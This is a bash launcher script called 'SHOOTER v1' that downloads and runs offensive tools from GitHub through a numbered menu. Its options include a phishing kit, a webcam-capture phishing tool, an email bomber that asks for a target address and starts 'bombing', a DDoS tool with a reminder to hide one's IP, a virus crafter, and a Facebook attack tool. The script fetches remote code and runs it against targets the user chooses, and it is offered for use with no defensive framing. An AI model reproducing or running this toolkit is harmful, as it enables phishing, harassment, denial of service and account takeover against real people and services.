#!/bin/bash

clear
mkdir -p Armory
clear

echo -e '\033[1;31m 
 ███████╗██╗  ██╗ ██████╗  ██████╗ ████████╗███████╗██████╗ 
 ██╔════╝██║  ██║██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
 ███████╗███████║██║   ██║██║   ██║   ██║   █████╗  ██████╔╝
 ╚════██║██╔══██║██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗
 ███████║██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║
 ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝  v1
\033[0m'

echo -e '\033[1;36m═══════════════════════════════════════════════════════════════════════\033[0m'
echo -e '\033[1;37mCoded by:\033[0m \033[1;36makhileshpandey0180\033[0m'
echo -e '\033[1;37mGitHub:\033[0m \033[1;36mhttps://github.com/akhileshpandey0180\033[0m'
echo -e '\033[1;37mVersion:\033[0m \033[1;36m1\033[0m'
echo -e '\033[1;37mCTRL+C:\033[0m \033[1;36mexit\033[0m'
echo -e '\033[1;37mAuthor:\033[0m \033[1;36mAkhilesh Pandey\033[0m'
echo -e '\033[1;36m═══════════════════════════════════════════════════════════════════════\033[0m\n'

echo -e '\033[1;34m╔═════════════════════════════════════════════════════════════════════╗\033[0m'
echo -e '\033[1;34m║\033[0m\033[1;37m                         Welcome to the Script!                      \033[0m\033[1;34m║\033[0m'
echo -e '\033[1;34m╚═════════════════════════════════════════════════════════════════════╝\033[0m\n'

echo -e '\033[1;33mPlease select an option:\033[0m'
echo -e '\033[1;37m[1]\033[0m \033[1;35mRequests & Update\033[0m        \033[1;37m[2]\033[0m \033[1;35mPhishing Tool\033[0m'
echo -e '\033[1;37m[3]\033[0m \033[1;35mWebCam Hack\033[0m              \033[1;37m[4]\033[0m \033[1;35mSubscan\033[0m'
echo -e '\033[1;37m[5]\033[0m \033[1;35mGmail Bomber\033[0m             \033[1;37m[6]\033[0m \033[1;35mDDOS Attack\033[0m'
echo -e '\033[1;37m[7]\033[0m \033[1;35mHow to use?\033[0m              \033[1;37m[8]\033[0m \033[1;35mUninstall the downloaded programs\033[0m'
echo -e '\033[1;37m[9]\033[0m \033[1;35mIp Info\033[0m                  \033[1;37m[10]\033[0m \033[1;35mdorks-eye\033[0m'
echo -e '\033[1;37m[11]\033[0m \033[1;35mHackerPro\033[0m               \033[1;37m[12]\033[0m \033[1;35mRED_HAWK\033[0m'
echo -e '\033[1;37m[13]\033[0m \033[1;35mVirusCrafter\033[0m            \033[1;37m[14]\033[0m \033[1;35mInfo-Site\033[0m'
echo -e '\033[1;37m[15]\033[0m \033[1;35mBadMod\033[0m                  \033[1;37m[16]\033[0m \033[1;35mFacebash\033[0m'
echo -e '\033[1;37m[17]\033[0m \033[1;35mDARKARMY\033[0m                \033[1;37m[18]\033[0m \033[1;35mAUTO-IP-CHANGER\033[0m\n'

echo -e '\033[1;33mPlease select an option:\033[0m'
read -p "Enter your choice: " choice

case $choice in
    1) echo -e "\033[1;32mYou selected Requests & Update\033[0m";;
    2) echo -e "\033[1;32mYou selected Phishing Tool\033[0m";;
    3) echo -e "\033[1;32mYou selected WebCam Hack\033[0m";;
    4) echo -e "\033[1;32mYou selected Subscan\033[0m";;
    5) echo -e "\033[1;32mYou selected Gmail Bomber\033[0m";;
    6) echo -e "\033[1;32mYou selected DDOS Attack\033[0m";;
    7) echo -e "\033[1;32mYou selected How to use?\033[0m";;
    8) echo -e "\033[1;32mYou selected Uninstall the downloaded programs\033[0m";;
    9) echo -e "\033[1;32mYou selected Ip Info\033[0m";;
    10) echo -e "\033[1;32mYou selected dorks-eye\033[0m";;
    11) echo -e "\033[1;32mYou selected HackerPro\033[0m";;
    12) echo -e "\033[1;32mYou selected RED_HAWK\033[0m";;
    13) echo -e "\033[1;32mYou selected VirusCrafter\033[0m";;
    14) echo -e "\033[1;32mYou selected Info-Site\033[0m";;
    15) echo -e "\033[1;32mYou selected BadMod\033[0m";;
    16) echo -e "\033[1;32mYou selected Facebash\033[0m";;
    17) echo -e "\033[1;32mYou selected DARKARMY\033[0m";;
    18) echo -e "\033[1;32mYou selected AUTO-IP-CHANGER\033[0m";;
    *) echo -e "\033[1;31mInvalid option selected\033[0m";;
esac

if [[ $choice == 1 || $choice == 01 ]]; then
    clear
    echo -e "\033[47;31;5m Installing updates and requirements...\033[0m"
    sleep 5
    pkg install git -y
    pkg install python python3 -y
    pkg install pip pip3 -y
    pkg install curl -y
    apt update
    apt upgrade -y
    clear
    echo -e "\033[47;3;35m Update complete...\033[0m"
    sleep 3
    bash shooter.sh

elif [[ $choice == 2 || $choice == 02 ]]; then
    clear
    echo -e "\033[47;3;35m Installation may take some time\033[0m"
    sleep 3
    cd Armory
    git clone https://github.com/htr-tech/zphisher
    cd zphisher
    bash zphisher.sh

elif [[ $choice == 3 || $choice == 03 ]]; then
    clear
    echo -e "\033[47;3;35m Installation may take some time\033[0m"
    sleep 3
    cd Armory
    git clone https://github.com/techchipnet/CamPhish
    cd CamPhish
    bash camphish.sh

elif [[ $choice == 4 || $choice == 04 ]]; then
    clear
    echo -e "\033[47;3;35m Installation may take some time\033[0m"
    sleep 3
    git clone https://github.com/zidansec/subscan
    cd subscan
    read -p "Enter a domain e.g. (example.com): " sc
    ./subscan $sc

elif [[ $choice == 5 || $choice == 05 ]]; then
    clear
    echo -e "\033[47;3;35m Installation may take some time\033[0m"
    sleep 3
    cd Armory
    git clone https://github.com/juzeon/fast-mail-bomber.git
    cd fast-mail-bomber/
    mv config.example.php config.php
    php index.php update-providers
    rm -rf data/nodes.json data/dead_providers.json
    echo -e "\033[47;3;35m This installation will take a long time\033[0m"
    echo -e "\033[47;3;35m To stop, press Ctrl+C\033[0m"
    sleep 4
    php index.php update-nodes
    php index.php refine-nodes
    echo "-------------------------"
    read -p "Enter an email address to bomb: " mail
    echo "-------------------------"
    php index.php start-bombing $mail

elif [[ $choice == 6 || $choice == 06 ]]; then
    clear
    echo -e "\033[47;3;35m Installation may take some time\033[0m"
    sleep 3
    cd Armory
    git clone https://github.com/palahsu/DDoS-Ripper.git
    cd DDoS-Ripper
    python3 DRipper.py

echo -e "\033[47;3;35m Hide your IP before using\033[0m"

elif [[ $choice == 7 || $choice == 07 ]]; then
clear
echo "Youtube Video: https://www.youtube.com/watch?v=0ZFSjw9JvA8"
python3 -m webbrowser https://www.youtube.com/watch?v=0ZFSjw9JvA8
sleep 10
echo "Wait 10 seconds"
bash shooter.sh

elif [[ $choice == 8 || $choice == 08 ]]; then
clear
echo -e "\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m"
sleep 3 
rm -rf Armory

bash shooter.sh

elif [[ $choice == 9 || $choice == 09 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $choice == 10 || $choice == 010 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $choice == 11 || $choice == 011 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $choice == 12 || $choice == 012 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $choice == 13 || $choice == 013 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $choice == 14 || $choice == 014 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $choice == 15 || $choice == 015 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $choice == 16 || $choice == 016 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
git clone https://github.com/fu8uk1/facebash
cd facebash
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $choice == 17 || $choice == 017 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Armory
pkg install git
pkg install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
cd DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $choice == 18 || $choice == 018 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
echo -e "\033[47;3;35m This tool will require you to be (ROOT)\033[0m"
sleep 3
cd Armory
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[47;3;35m Go to your browser / change the proxy (sock proxy) to 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
aut

else   
    clear
    echo -e '\033[36;40;1m You have entered the wrong code'    
    sleep 1
    clear 
    bash shooter.sh
fi
